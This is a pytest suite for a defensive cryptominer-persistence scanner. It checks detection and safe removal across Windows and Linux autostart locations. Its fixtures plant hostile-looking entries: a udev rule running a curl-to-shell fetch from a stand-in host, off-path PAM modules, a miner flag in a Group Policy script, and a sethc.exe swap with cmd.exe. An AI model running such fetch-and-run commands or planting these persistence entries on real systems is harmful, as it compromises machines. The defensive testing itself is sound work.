"""The autostart locations added for issue #11.

Each location gets two tests: a positive control (a planted miner entry must be
reported) and a negative one (the real machine's own entries must not be). The
negative half is the harder half — a persistence scanner that cries wolf about
every netsh helper on the machine is worse than one that does not look.
"""

import os

import pytest

from minersentry import persistence as P
from minersentry.config import Config

CFG = Config()
THRESHOLD = CFG.persistence_min_score


def _untrusted(exe, trusted_dirs, untrusted_hints=()):
    return False


def _trusted(exe, trusted_dirs, untrusted_hints=()):
    return True


def _score(kind, name, command, exe=None, trusted=False, isfile=True,
           location="HKLM\\X"):
    entry = P.PersistEntry(kind=kind, location=location, name=name,
                           command=command,
                           exe=exe if exe is not None else P.command_exe(command))
    return P.score_entry(entry, CFG, is_trusted=_trusted if trusted else _untrusted,
                         isfile=lambda p: isfile)


# == the trust-first rule these locations rely on ===========================
@pytest.mark.parametrize("kind", ["netsh-helper", "appcert-dll", "active-setup",
                                  "print-monitor", "lsa-package", "gpo-script",
                                  "pam-module", "udev-rule"])
def test_a_signed_system_file_in_a_rare_location_is_not_reported(kind):
    """There is no allowlist of known-good DLLs in this module. Instead a
    trusted file earns only the rare-location weight, which must stay below the
    reporting threshold — that is the whole reason no allowlist is needed."""
    e = _score(kind, "legit", r"C:\Windows\System32\legit.dll",
               exe=r"C:\Windows\System32\legit.dll", trusted=True)
    assert e.score == P.W_RARE_LOCATION
    assert e.score < THRESHOLD, (
        "a trusted file in a rare location would be reported, which turns every "
        "machine's own netsh helpers and print monitors into findings")


@pytest.mark.parametrize("kind", ["netsh-helper", "appcert-dll", "active-setup",
                                  "print-monitor", "lsa-package"])
def test_an_unsigned_dll_in_a_rare_location_is_reported(kind):
    e = _score(kind, "evil", r"C:\Users\x\AppData\Local\Temp\evil.dll",
               exe=r"C:\Users\x\AppData\Local\Temp\evil.dll")
    assert e.score >= THRESHOLD, e.labels


# == bare module names must be resolved before scoring =====================
def test_a_bare_dll_name_resolves_against_system32():
    assert P.resolve_system_dll(
        "dhcpcmonitor.dll", isfile=lambda p: True,
        system_root=r"C:\Windows") == r"C:\Windows\System32\dhcpcmonitor.dll"


def test_a_full_path_is_left_alone():
    for value in (r"C:\Temp\x.dll", r"\\server\share\x.dll", "/opt/x.so"):
        assert P.resolve_system_dll(value, isfile=lambda p: False) == value


def test_a_bare_name_with_no_file_in_system32_stays_bare():
    out = P.resolve_system_dll("nope.dll", isfile=lambda p: False,
                               system_root=r"C:\Windows")
    assert out == "nope.dll"


def test_an_empty_value_resolves_to_nothing():
    assert P.resolve_system_dll("") == ""
    assert P.resolve_system_dll('  "" ') == ""


def test_an_unresolved_name_cannot_be_scored_on_its_file():
    """If resolution fails the entry still scores, it just cannot earn the
    unsigned or drop-location weight — there is no file to look at. This is why
    resolution happens at collection time and not in the scorer."""
    e = _score("print-monitor", "Local Port", "localspl.dll",
               exe="localspl.dll", isfile=False)
    assert e.score == P.W_RARE_LOCATION


# == Group Policy scripts ===================================================
SCRIPTS_INI = """\
[Startup]
0CmdLine=\\\\dc01\\netlogon\\setup.cmd
0Parameters=
1CmdLine=C:\\Users\\Public\\x.exe
1Parameters=--donate-level 0
[Logon]
0CmdLine=logon.vbs
0Parameters=
"""


def test_group_policy_scripts_are_parsed_with_their_parameters():
    out = P.parse_ini_scripts(SCRIPTS_INI, r"C:\Windows\...\scripts.ini")
    commands = {e.command for e in out}
    assert r"\\dc01\netlogon\setup.cmd" in commands
    assert r"C:\Users\Public\x.exe --donate-level 0" in commands
    assert all(e.kind == "gpo-script" for e in out)
    assert len(out) == 3


def test_a_group_policy_script_carrying_a_miner_flag_is_reported():
    out = P.parse_ini_scripts(SCRIPTS_INI, "scripts.ini")
    miner = [P.score_entry(e, CFG, is_trusted=_untrusted, isfile=lambda p: True)
             for e in out if "donate-level" in e.command][0]
    assert miner.score >= THRESHOLD, miner.labels


def test_an_empty_or_commented_scripts_ini_yields_nothing():
    assert P.parse_ini_scripts("", "x") == []
    assert P.parse_ini_scripts("[Startup]\n; 0CmdLine=x\n0CmdLine=\n", "x") == []


# == accessibility-binary swaps =============================================
def test_an_accessibility_binary_identical_to_cmd_is_caught():
    digest = "a" * 64
    out = P.swapped_binaries({"sethc.exe": digest, "osk.exe": "b" * 64},
                             {"cmd.exe": digest, "powershell.exe": "c" * 64})
    assert out == [("sethc.exe", "cmd.exe")]


def test_genuine_accessibility_binaries_are_not_flagged():
    out = P.swapped_binaries({"sethc.exe": "1" * 64, "utilman.exe": "2" * 64},
                             {"cmd.exe": "9" * 64})
    assert out == []


def test_unreadable_files_are_not_matched_to_each_other():
    """file_digest returns "" when it cannot read. Two empty strings must not
    count as a match, or an access-denied System32 would report every binary."""
    assert P.swapped_binaries({"sethc.exe": ""}, {"cmd.exe": ""}) == []


def test_a_swap_scores_on_its_own():
    """This one does not go through the weights: the file in System32 IS a
    shell, so nothing else has to corroborate it."""
    e = _score("accessibility-swap", "sethc.exe",
               r"C:\Windows\System32\sethc.exe (identical to cmd.exe)",
               exe=r"C:\Windows\System32\sethc.exe", trusted=True)
    assert e.score >= THRESHOLD
    assert e.score == P.W_SYSTEM_SWAP


def test_file_digest_answers_rather_than_raising(tmp_path):
    f = tmp_path / "x.bin"
    f.write_bytes(b"hello")
    assert len(P.file_digest(str(f))) == 64
    assert P.file_digest(str(tmp_path / "missing.bin")) == ""
    assert P.file_digest(str(tmp_path)) == ""      # a directory, not a file


# == PAM ====================================================================
PAM_FILE = """\
# comment
auth       required     pam_unix.so nullok
auth       optional     /lib/x86_64-linux-gnu/security/pam_cap.so
auth       required     /opt/evil/pam_miner.so
-session   optional     /tmp/x.so
session    required     pam_systemd.so
account    sufficient
"""


def test_only_off_path_pam_modules_are_reported():
    out = P.parse_pam_config(PAM_FILE, "/etc/pam.d/sshd")
    assert {e.command for e in out} == {"/opt/evil/pam_miner.so", "/tmp/x.so"}
    assert all(e.kind == "pam-module" for e in out)


def test_bare_pam_module_names_are_ignored():
    """Every machine has hundreds of these and they are the normal case."""
    assert P.parse_pam_config("auth required pam_unix.so\n", "/etc/pam.d/x") == []


def test_a_short_or_malformed_pam_line_does_not_raise():
    assert P.parse_pam_config("auth\nauth required\n\n#\n-\n", "/etc/pam.d/x") == []


def test_an_off_path_pam_module_in_a_drop_directory_is_reported():
    out = P.parse_pam_config(PAM_FILE, "/etc/pam.d/sshd")
    tmp = [P.score_entry(e, CFG, is_trusted=_untrusted, isfile=lambda p: True)
           for e in out if e.command.startswith("/tmp/")][0]
    assert tmp.score >= THRESHOLD, tmp.labels


# == udev ===================================================================
UDEV_RULES = """\
# comment
ACTION=="add", SUBSYSTEM=="net", RUN+="/usr/bin/legit --up"
ACTION=="add", RUN+="/tmp/.x/miner"
SUBSYSTEM=="block", PROGRAM="/bin/sh -c 'curl http://x/y|sh'"
KERNEL=="sd*", IMPORT{program}="/opt/tool/probe"
ACTION=="remove", RUN+=""
LABEL="end"
"""


def test_udev_rules_that_run_a_program_are_collected():
    out = P.parse_udev_rules(UDEV_RULES, "/etc/udev/rules.d/99-x.rules")
    assert {e.command for e in out} == {
        "/usr/bin/legit --up", "/tmp/.x/miner",
        "/bin/sh -c 'curl http://x/y|sh'", "/opt/tool/probe"}
    assert all(e.kind == "udev-rule" for e in out)


def test_a_udev_rule_with_no_program_is_not_an_entry():
    assert P.parse_udev_rules('LABEL="end"\nACTION=="add"\n', "x") == []
    assert P.parse_udev_rules("# RUN+=\"/tmp/x\"\n", "x") == []


def test_a_udev_rule_running_from_a_drop_directory_is_reported():
    out = P.parse_udev_rules(UDEV_RULES, "/etc/udev/rules.d/99-x.rules")
    drop = [P.score_entry(e, CFG, is_trusted=_untrusted, isfile=lambda p: True)
            for e in out if e.command.startswith("/tmp/")][0]
    assert drop.score >= THRESHOLD, drop.labels


# == removal: the new kinds must refuse rather than break the system =======
@pytest.mark.parametrize("kind,must_mention", [
    ("lsa-package", "boot"),
    ("print-monitor", "Spooler"),
    ("gpo-script", "Group Policy"),
    ("office-addin", "LoadBehavior"),
    ("accessibility-swap", "sfc"),
    ("pam-module", "locks every account out"),
])
def test_the_unsafe_removals_refuse_and_say_what_to_do(kind, must_mention,
                                                       monkeypatch):
    """Each of these would damage a working system if removed mechanically.
    They are reported with instructions instead of being acted on.

    The platform is pinned because the registry-backed kinds answer "there is
    nothing of that kind on this platform" off Windows, before they reach the
    guidance this asserts on. That early return has its own test below; what
    is being checked here is the wording, which is the same either way.
    """
    monkeypatch.setattr(P, "IS_WINDOWS", True)
    entry = P.PersistEntry(kind=kind, location="HKLM\\X\\Y", name="thing",
                           command="x", exe="x")
    result = P.remove_entry(entry)
    assert not result.ok
    assert must_mention.lower() in result.message.lower(), result.message


@pytest.mark.parametrize("kind", ["netsh-helper", "appcert-dll", "active-setup"])
def test_the_plain_value_kinds_route_to_registry_removal(kind, monkeypatch):
    """These three are single-string registry values: deleting one removes the
    entry and nothing else, so removal is allowed."""
    seen = []
    monkeypatch.setattr(P, "_remove_registry_value",
                        lambda e: seen.append(e.kind) or
                        P.quarantine.Result(True, "removed"))
    monkeypatch.setattr(P, "IS_WINDOWS", True)
    entry = P.PersistEntry(kind=kind, location="HKLM\\X", name="n",
                           command="c", exe="c")
    assert P.remove_entry(entry).ok
    assert seen == [kind]


def test_registry_kinds_answer_off_windows(monkeypatch):
    monkeypatch.setattr(P, "IS_WINDOWS", False)
    for kind in ("netsh-helper", "appcert-dll", "active-setup", "lsa-package",
                 "print-monitor", "office-addin"):
        result = P.remove_entry(P.PersistEntry(
            kind=kind, location="HKLM\\X", name="n", command="c", exe="c"))
        assert not result.ok
        assert "registry" in result.message.lower()


# == the real machine ========================================================
@pytest.mark.skipif(os.name != "nt", reason="these locations are Windows-only")
def test_the_machines_own_rare_locations_are_quiet():
    """The negative control, run against whatever this machine actually has."""
    rare = {"netsh-helper", "appcert-dll", "active-setup", "print-monitor",
            "lsa-package", "gpo-script", "accessibility-swap"}
    entries = []
    for collect in (P._collect_load_points, P._collect_lsa,
                    P._collect_gpo_scripts, P._collect_accessibility):
        try:
            entries += collect()
        except Exception:  # noqa: BLE001
            continue
    noisy = [e for e in (P.score_entry(e, CFG) for e in entries)
             if e.kind in rare and e.score >= THRESHOLD]
    assert noisy == [], [(e.kind, e.name, e.score, e.labels) for e in noisy]


@pytest.mark.skipif(os.name != "nt", reason="these locations are Windows-only")
def test_every_collected_entry_has_the_fields_the_report_needs():
    for collect in (P._collect_load_points, P._collect_lsa):
        for e in collect():
            assert e.kind and e.location and e.name and e.command
            # a name built from an empty list element produced ".dll" before
            assert e.name.strip(". ") == e.name.strip(". ").strip()
            assert not e.name.startswith(".")
            assert not os.path.basename(e.exe).startswith(".")
